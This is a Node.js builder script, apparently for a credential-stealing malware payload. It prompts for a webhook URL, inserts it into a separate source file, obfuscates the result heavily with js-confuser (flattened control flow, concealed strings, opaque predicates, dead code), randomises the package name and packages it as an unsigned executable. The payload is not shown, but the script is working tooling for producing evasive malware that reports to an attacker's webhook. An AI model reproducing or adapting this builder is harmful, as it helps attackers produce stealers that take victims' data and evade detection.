(async () => {
    console.clear()
    process.title = ''

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const fs = require('fs')
    const cmd = require('child_process')
    const path = require('path')

    const chalk = (await import('chalk')).default
    const words = (await import('random-words')).generate
    const confuser = require('js-confuser')
    const pkg = require('@yao-pkg/pkg')
    const readline = require('readline-sync')

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.cyan(`
 ▄▄▄▄    █    ██  ██▓ ██▓    ▓█████▄ 
▓█████▄  ██  ▓██▒▓██▒▓██▒    ▒██▀ ██▌
▒██▒ ▄██▓██  ▒██░▒██▒▒██░    ░██   █▌
▒██░█▀  ▓▓█  ░██░░██░▒██░    ░▓█▄   ▌
░▓█  ▀█▓▒▒█████▓ ░██░░██████▒░▒████▓ 
░▒▓███▀▒░▒▓▒ ▒ ▒ ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ 
▒░▒   ░ ░░▒░ ░ ░  ▒ ░░ ░ ▒  ░ ░ ▒  ▒ 
 ░    ░  ░░░ ░ ░  ▒ ░  ░ ░    ░ ░  ░ 
 ░         ░      ░      ░  ░   ░    
      ░                       ░
      \n\n`))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    const nome = words()

    const versao = async () => {
        return await new Promise(async (resolve) => {
            resolve(Math.floor(Math.random() * 9) + '.' + Math.floor(Math.random() * 9) + '.' + Math.floor(Math.random() * 9))
        })
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    let source = await fs.promises.readFile(path.join(__dirname, 'src', 'index.js'), 'utf-8')

    const webhook = readline.question(chalk.bold.yellow('[?] Webhook: '))
    source = source.replace('*WEBHOOK*', webhook)

    console.log(chalk.bold.blue('[#] Obfuscating file.'))

    const obfuscar = await confuser.obfuscate(source, {
        "target": "node",
        "preset": "low",
        "compact": false,
        "hexadecimalNumbers": true,
        "minify": false,
        "es5": false,
        "renameVariables": true,
        "renameGlobals": true,
        "identifierGenerator": "randomized",
        "controlFlowFlattening": 1,
        "globalConcealing": false,
        "stringCompression": 1,
        "stringConcealing": 1,
        "stringEncoding": 1,
        "stringSplitting": 1,
        "duplicateLiteralsRemoval": true,
        "dispatcher": 1,
        "rgf": 1,
        "flatten": 1,
        "objectExtraction": false,
        "deadCode": 1,
        "calculator": 1,
        "movedDeclarations": true,
        "opaquePredicates": 1,
        "shuffle": {
            "hash": 0.5,
            "true": 0.5
        },
        "stack": 1
    })

    await fs.promises.writeFile(path.join(__dirname, `${nome}.js`), obfuscar)

    console.log(chalk.bold.green('[$] File obfuscated successfully.'))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.blue('[#] Changing package.json data.'))

    const package = JSON.parse(await fs.promises.readFile(path.join(__dirname, 'package.json'), 'utf-8'))

    package.name = nome
    package.main = `./${nome}.js`
    package.bin = `./${nome}.js`

    await fs.promises.writeFile(path.join(__dirname, 'package.json'), JSON.stringify(package, null, 3))

    console.log(chalk.bold.green('[$] Package.json data changed successfully.'))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.blue('[#] Redeveloping native modules.'))

    await new Promise(async (resolve) => {
        cmd.exec('npm run rebuild', async (err, ok) => {
            if (err) {
                console.log(chalk.bold.red('[@] Error when rebiuding native modules:'), err)
                resolve(process.exit(1))
            } else {
                console.log(chalk.bold.green('[#] Success in rebiuding the native modules!'))
                resolve(true)
            }
        })
    })

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.blue('[#] Creating the executable.'))

    await pkg.exec([
        '.', '-d',
        '--public',
        '--no-bytecode',
        '--no-signature',
        '-C', 'Brotli'
    ])

    console.log(chalk.bold.green('[$] Executable created successfully.'))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////

    console.log(chalk.bold.blue('[#] Deleting files created during the process.'))

    await fs.promises.unlink(`${nome}.js`)

    console.log(chalk.bold.green('[$] Files deleted successfully.'))

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
})()